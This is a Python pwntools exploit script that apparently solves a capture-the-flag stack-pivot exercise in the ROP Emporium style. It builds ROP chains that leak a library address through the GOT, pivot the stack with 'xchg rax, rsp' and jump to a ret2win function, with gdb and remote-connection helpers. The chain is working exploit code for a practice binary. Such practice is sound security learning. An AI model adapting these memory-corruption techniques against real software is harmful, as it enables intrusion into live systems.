#!/usr/bin/env python3

from argparse import ArgumentParser
from pwn import *


def get_proc(gdb_script=""):
    """
    Get the tube specified by command line arguments.
    """
    return _get_proc(*parse_args(), gdb_script)


def parse_args():
    """
    Parse command line arguments.
    """
    parser = ArgumentParser(description="pwn/re template")
    parser.add_argument("executable", type=str, help="path to executable")
    parser.add_argument("remote", default=[None, None], nargs="*", help="remote hostname and port")
    args = parser.parse_args()
    host, port = parse_remote(args.remote)
    return args.executable, host, port


def parse_remote(remote):
    """
    Validate command line arguments.
    """
    if isinstance(remote, str):
        remote = remote.split(":")
    try:
        host, port = remote
    except ValueError:
        raise ValueError("host and port required to use remote")
    return host, port


def _get_proc(executable, host, port, gdb_script):
    """
    Get a remote tube if host/port specified, otherwise a gdb-over-ssh tube to
    a VM/Docker environment.
    """
    context.binary = executable
    context.terminal = ['gnome-terminal', '--tab', '-e']
    if host is not None or port is not None:
        if host is None or port is None: 
            raise ValueError("both host and port must be specified for remote")
        proc = remote(host, port)
    else:        
        proc = gdb.debug(
            exe=executable,
            gdbscript=gdb_script,
            args=[executable],
            ssh=ssh('test','localhost', 2222, "test", ignore_config=True)
        )
    return proc


def main():
    gdb_script="""
    set sysroot ./
    set solib-search-path ./
    b  *0x4009a7
    c
    """
    p = get_proc(gdb_script)

    p.readuntil(b"The Old Gods kindly bestow upon you a place to pivot: ")
    pivot_addr = int(p.readline().strip(), 0x10)
 
    # leak libpivot address and call main again
    payload = p64(context.binary.sym.foothold_function)
    payload += p64(0x400a33) # pop rdi; ret; 
    payload += p64(0x601040) # plt/got pointer to foothold_function
    payload += p64(context.binary.sym.puts)
    payload += p64(context.binary.sym.main)
    p.sendline(payload)
    print(payload)

    # pivot to address leak rop chain
    payload = b"a" * cyclic_find(0x6161616161616166, n=8)
    payload += p64(0x4009bb) # pop rax; ret; 
    payload += p64(pivot_addr)
    payload += p64(0x4009bd) # xchg rax, rsp; ret; 
    p.send(payload) # send here to avoid an extra newline
    print(payload)

    # collect libpivot leak
    p.readuntil(b"foothold_function(): Check out my .got.plt entry to gain a foothold into libpivot\n")
    foothold_function_leak = int.from_bytes(p.recvline()[:-1], "little")
    print(hex(foothold_function_leak))

    p.readuntil(b"The Old Gods kindly bestow upon you a place to pivot: ")
    pivot_addr = int(p.readline().strip(), 0x10)
 
    # we only neet 8B to execute ret2win, so no need for a 2nd pivot
    p.sendline(b"")
    print(payload)
     
    # call ret2win
    payload = b"a" * cyclic_find(0x6161616161616166, n=8)
    payload += p64(foothold_function_leak + 0x117) # ret2win address
    p.sendline(payload)
    print(payload)

    p.interactive()



if __name__ == "__main__":
    main()
